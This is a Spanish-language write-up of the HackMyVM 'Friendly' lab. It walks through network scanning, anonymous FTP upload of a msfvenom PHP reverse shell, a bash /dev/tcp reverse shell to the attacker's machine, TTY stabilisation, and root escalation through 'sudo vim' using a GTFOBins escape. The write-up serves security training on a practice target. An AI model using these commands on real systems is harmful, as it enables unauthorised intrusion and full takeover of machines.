# Escalada de Privilegios en Linux – Sudo -l

Maquinas que vamos a utilizar **Kali Linux y Friendly** [https://hackmyvm.eu/machines/machine.php?vm=Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)

Una vez hayamos obtenido acceso remoto al servidor, es necesario proceder con la escalada de privilegios, para poder convertirnos en el usuario root del sistema y así contar con todo tipo de permisos sobre el mismo.

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image.png)

```bash
ping -c 1 10.0.3.21
```

![image.png](./imagenes/image%201.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.21 
```

![image.png](./imagenes/image%202.png)

Vemos que esta habilitado el login como Anonymous en el FTP por el puerto 21.

- Accedemos por el FTP
    
    ```bash
    ftp 10.0.3.21 
    ```
    
    ![image.png](./imagenes/image%203.png)
    
    Usuario anonymous  contraseña la dejamos en blanco.
    
    Salimos del FTP
    
    `exit`
    

- Creamos un archivo malicioso con msfvenom en el escritorio.
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > pwned.php
    ```
    
    ![image.png](./imagenes/image%204.png)
    

- Volvemos a entrar el el FTP como la vez anterior
    
    ```bash
    ftp 10.0.3.21 
    ```
    
    ![image.png](./imagenes/image%205.png)
    
    - Subimos el archivo **pwned.php.**
        
        `put pwned.php`
        
        ![image.png](./imagenes/image%206.png)
        
        `exit`
        
    
- Nos ponemos a la escucha con netcat por el puerto 443 que era el de muestro archivo malicioso..
    
    ```bash
    nc -nlvp 443 
    ```
    
    ![image.png](./imagenes/image%207.png)
    

- Como ya hemos aprendido una conexión  creada por msfvemon es muy inestable así que vamos a estabilizarla. Nos vamos a la web [https://www.revshells.com/](./imagenes/https://www.revshells.com/) y copiamos el código generado.
    
    ![image.png](./imagenes/image%208.png)
    

- En otra terminal nos ponemos a la escucha con netcat por el puerto 444 que es el que hemos puesto en el código que acabamos de generar.
    
    ```bash
    nc -nlvp 444 
    ```
    
    ![image.png](./imagenes/image%209.png)
    
- Nos vamos al navegador web y ponemos la URL http://10.0.3.21/pwned.php
    
    ![image.png](./imagenes/image%2010.png)
    
    ![image.png](./imagenes/image%2011.png)
    

- Escribimos lo siguiente
    
    `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
    
    ![image.png](./imagenes/image%2012.png)
    
    ![image.png](./imagenes/image%2013.png)
    

Hasta aquí ya lo habíamos visto.

---

- **Tratamiento de la TTY**
    
    `script /dev/null -c bash`
    
    `CTRL+Z`
    
    ![image.png](./imagenes/image%2014.png)
    

`stty raw -echo; fg`

`reset xterm`

![image.png](./imagenes/image%2015.png)

`export TERM=xterm`

`export SHELL=bash`

![image.png](./imagenes/image%2016.png)

---

- Vamos a ver **escaladas de privilegios básicas** vamos a utilizar **sodo -l** , este comando a veces funciona y a veces no pero si funciona anos puede dar información útil.
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2017.png)
    
    ![image.png](./imagenes/image%2018.png)
    
    <aside>
    💡
    
    Este mensaje indica que el usuario **www-data  (en este caso soy yo, podemos comprobarlo haciendo un whoami)** puede **ejecutar el comando vim** en el sistema llamado friendly **sin necesidad de contraseña** (NOPASSWD). Además, **no hay restricciones** sobre qué comandos o privilegios puede usar (ALL : ALL). **En resumen, este usuario tiene acceso sin restricciones a ejecutar vim.**
    
    </aside>
    
    Nos puede aparecer vim como otras herramientas. Como es lógico es imposible saber de memoria como escalar en cada herramienta. por eso vamos a utilizar la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/).
    
    ![image.png](./imagenes/image%2019.png)
    
    En el buscador de la web ponemos la herramienta que nos a parecido y con la cual queremos escalar privilegios.
    
    ![image.png](./imagenes/image%2020.png)
    
    ![image.png](./imagenes/image%2021.png)
    

- Nos debemos  preguntar ¿Cómo hemos enumerado que podemos utilizar vim?
    
    ![image.png](./imagenes/image%2022.png)
    
    Lo hemos hecho con el comando **SUDO**
    

- Nos movemos hasta encontrar **Sudo** en la web **dentro de Vim**
    
    ![image.png](./imagenes/image%2023.png)
    
    Vemos que tenemos varios opciones. Probamos la primera.
    
    `sudo /usr/bin/vim -c ':!/bin/sh'`
    
    ![image.png](./imagenes/image%2024.png)
    
    Si funciona nos convertimos en Root
    
    ![image.png](./imagenes/image%2025.png)